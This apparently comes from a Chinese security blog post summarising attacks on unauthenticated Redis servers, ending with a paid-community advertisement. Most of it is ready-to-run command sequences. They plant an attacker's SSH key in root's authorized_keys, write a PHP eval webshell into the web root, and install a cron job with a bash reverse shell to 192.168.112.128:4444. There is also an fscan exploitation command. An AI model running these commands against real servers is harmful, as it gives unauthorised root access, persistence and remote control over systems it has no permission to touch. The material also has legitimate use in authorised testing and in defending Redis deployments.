#  干货 | Redis的漏洞总结(建议收藏)   
自然嗨  渗透安全团队   2024-03-11 18:46  
  
声明  
  
该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载。请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。   
  
  
  
  
  
  
  
  
**01**  
  
**漏洞探测**  
  
redis默认情况是空密码连接而且如果是root权限的话,会造成很大的危害。  
  
  
Namp  
```
nmap -sV -p6379 -Pn  ip
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT33xIQ1sV5m8utRexmCUibrjibZybffQCiaNG5sib2blzicyKbcv6IWfaLuTfZkHHSqwOla8WyJQKDAgOA/640?wx_fmt=png "")  
**Nuclei**  
```
nuclei.exe  -u  ip
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT33xIQ1sV5m8utRexmCUibrjGicIgVQ9A24W7Q4cTWuEDtDFspIMThszLkAQTRic53JaR2uiayq7mFtrA/640?wx_fmt=png "")  
  
**02**  
  
******未授权登录******  
  
当扫描发现主机端口对应的服务地址后，使用本地Redis客户端连接服务器获取敏感数据了。  
```
redis-cli   -h  ip
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT33xIQ1sV5m8utRexmCUibrjObxoso6b5QiaKibfRAhYaMnVT5ayDr6wzrfnQwz8joNJG385SmpPiaRuw/640?wx_fmt=png "")  
  
  
**03**  
  
**写入SSH公钥**  
  
在攻击机中生成ssh公钥和私钥，密码设置为空  
```
ssh-keygen -t rsa
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT33xIQ1sV5m8utRexmCUibrjVd2veYXm0IDQ9cekosQxW1tlsNzRrVV8LMo5nj1euz0WicdASHlvSbw/640?wx_fmt=png "")  
```
cd /root/.ssh
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT33xIQ1sV5m8utRexmCUibrjwslOiaTHhScGEaicLDL0U1gQjxx9XJdiczXiar6hyJrQEickIAmRFkfcZSA/640?wx_fmt=png "")  
  
id_rsa 是私钥文件，id_rsa.pub是公钥文件,现在需要将公钥文件上传到redis服务器上，通过私钥文件连接。  
```
cat id_rsa.pub //查询公钥里面的内容
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9RP06xy1QBknlEBqIGwFZ7hecRtgyEIu1xYABNiJe1SalSJHrk4WMb3QVdZMNoGB5A3dnd/fgNzISRKDxG2W5XSnlCVaKZCVA9OBmPfrw4IUAkBjJZlcSafQSQJEm2VRRmkmMxutI5uTTHcAFke/WdEBi75QfJ+XZz8MdW8MJy7Z1JqF7GI9yUShQPOEYfF0UaMzho49m0PpieD9wI/2pilJSMzA98hQtyUMEhyWe5DQ2dzq/lnMwsYHdqA/Quh6Q3kH647iMJIXz5LZDrcVz0ERbOAm3M6FCSF6HNSfQPPZzRgVQEnSzdrL6xruvH8hAT+khk8B5NlicRTYJ7wQ64tSug9HmAbvq8DnmJ8+b0N0EEy7ooMXs8XEvkQzfRsIjKSYeT9650C/kggTKLEdpLSqp/Qtdj6gIlncfWveAgkU2rznaDWmKDdQrrM6xSfbx0Xi/UYEkjPOcKJ72BpNV3ZwHhUu5lValEglyt0P6FcDdE607hjYC+WevwZbofsc= root@kali
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT33xIQ1sV5m8utRexmCUibrjt6jrEyYic7pMIynicBo9iaVwEOAlb1D73ibRnSu0xPTzYEWfibV3Q7j73YQ/640?wx_fmt=png "")  
  
更改redis备份路径为/root/.ssh，并修改上传公钥文件的名称为 authorized_keys  
```
./redis-cli -h  ip  
config set dir /root/.ssh/
config set dbfilename authorized_keys
set x "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9RP06xy1QBknlEBqIGwFZ7hecRtgyEIu1xYABNiJe1SalSJHrk4WMb3QVdZMNoGB5A3dnd/fgNzISRKDxG2W5XSnlCVaKZCVA9OBmPfrw4IUAkBjJZlcSafQSQJEm2VRRmkmMxutI5uTTHcAFke/WdEBi75QfJ+XZz8MdW8MJy7Z1JqF7GI9yUShQPOEYfF0UaMzho49m0PpieD9wI/2pilJSMzA98hQtyUMEhyWe5DQ2dzq/lnMwsYHdqA/Quh6Q3kH647iMJIXz5LZDrcVz0ERbOAm3M6FCSF6HNSfQPPZzRgVQEnSzdrL6xruvH8hAT+khk8B5NlicRTYJ7wQ64tSug9HmAbvq8DnmJ8+b0N0EEy7ooMXs8XEvkQzfRsIjKSYeT9650C/kggTKLEdpLSqp/Qtdj6gIlncfWveAgkU2rznaDWmKDdQrrM6xSfbx0Xi/UYEkjPOcKJ72BpNV3ZwHhUu5lValEglyt0P6FcDdE607hjYC+WevwZbofsc= root@kali\n\n\n"
save
exit
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT33xIQ1sV5m8utRexmCUibrj3X0wbbtYfa1MnTMiavE1kk26VACJzAXRralUgursvFXG5yFRHAMYv2Q/640?wx_fmt=png "")  
```
ssh -i  id_rsa root@ip
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT33xIQ1sV5m8utRexmCUibrjVFN7QkyFrZoe2H6y6KEeVd2tpHF9wfcRauZwd7VYibK0LHUIenrAj9w/640?wx_fmt=png "")  
  
  
**04**  
  
**写入一句话木马**  
  
如果该服务器上部署网站的话可以通过写入一句话木马的方式进行攻击  
```
config set dir /var/www/html/   // 必须知道网站目录
config set  dbfilename shell.php 
set x "<?php eval($_POST['cmd']);?>" 
或者：
set shell "\r\n\r\n<?php @eval($_POST['cmd']);?>\r\n\r\n"
save
exit
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT33xIQ1sV5m8utRexmCUibrjqcniaScAQTIADiaXKOvQlibP0hWx9NhY2PPP9r4qPFJAFDcTQhbAJ16FA/640?wx_fmt=png "")  
  
用蚁剑连接  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CicIXicDugvT33xIQ1sV5m8utRexmCUibrjAE9ENlcuicgyCnDFDRhd42aiaS6NIUFRRrWAuJFQVAuwMozHsZs2YAOg/640?wx_fmt=jpeg "")  
  
连接成功！    
  
  
**05**  
  
**反弹shell**  
```
nc -lvnp 4444
redis-cli -h ip  #登陆到redis数据库
set  xx   "\n* * * * * bash -i >& /dev/tcp/192.168.112.128/4444 0>&1\n"
config set dir /var/spool/cron  #设置工作目录
config set dbfilename root      #设置文件名，当前用户叫啥就得命名为啥，当前用户为root
save                            #保存
exit
```  
  
写入计划任务  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CicIXicDugvT33xIQ1sV5m8utRexmCUibrjWCG5uHplmEczl6924zG3C4x2wHjGqG3tZICphw4amzQmQKmHO6cE3Q/640?wx_fmt=png "")  
注意：当我们在做应急响应的时候发现 上图红框处存在redis写计划任务特征，要特别留意反弹成功  
**06**  
  
**fscan内网利用**  
  
**写入SSH公钥**  
./fscan_amd64  -h ip  -np  -nopoc -no -rf  id_rsa.pub   -m redisssh  -i  id_rsa  root@ip★付费圈子欢 迎 加 入 星 球 ！代码审计+免杀+渗透学习资源+各种资料文档+各种工具+付费会员进成员内部群星球的最近主题和星球内部工具一些展示加入安全交流群
								
									
										
									
				                
			                推荐阅读干货｜史上最全一句话木马干货 | CS绕过vultr特征检测修改算法实战 | 用中国人写的红队服务器搞一次内网穿透练习实战 | 渗透某培训平台经历实战 | 一次曲折的钓鱼溯源反制免责声明由于传播、利用本公众号渗透安全团队所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号渗透安全团队及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！好文分享收藏赞一下最美点在看哦  
  
